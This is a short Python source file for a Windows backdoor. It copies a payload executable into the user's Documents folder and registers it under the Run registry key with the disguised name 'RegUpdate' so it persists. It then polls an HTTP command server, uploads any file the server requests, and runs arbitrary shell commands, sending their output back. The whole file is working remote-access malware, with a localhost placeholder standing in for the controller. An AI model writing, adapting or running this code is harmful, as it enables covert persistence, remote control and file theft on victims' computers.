import os
import shutil
import winreg as wreg
import subprocess
import requests
import time

path = os.getcwd().strip('/n')
# To get the username
Null, userprof = subprocess.check_output('set USERPROFILE', shell=True).decode('utf-8').split('=')
destination = userprof.strip('\n\r') + '\\Documents\\' + 'Your_payload.exe' 

if not os.path.exists(destination):

    shutil.copyfile(path+'\Your_payload.exe', destination)
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdate', 0, wreg.REG_SZ,destination)
key.close()

while True:
    req = requests.get('http://127.0.0.1')
    command = req.text
    if 'terminate' in command:
        break

    elif 'grab' in command:
        grab, path = command.split('*')

        if os.path.exists(path):
            url = 'http://127.0.0.1/store'
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url='http://127.0.0.1', data='file not found')

    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://127.0.0.1', data=CMD.stdout.read())
        post_response = requests.post(url='http://127.0.0.1', data=CMD.stderr.read())

    time.sleep(3)
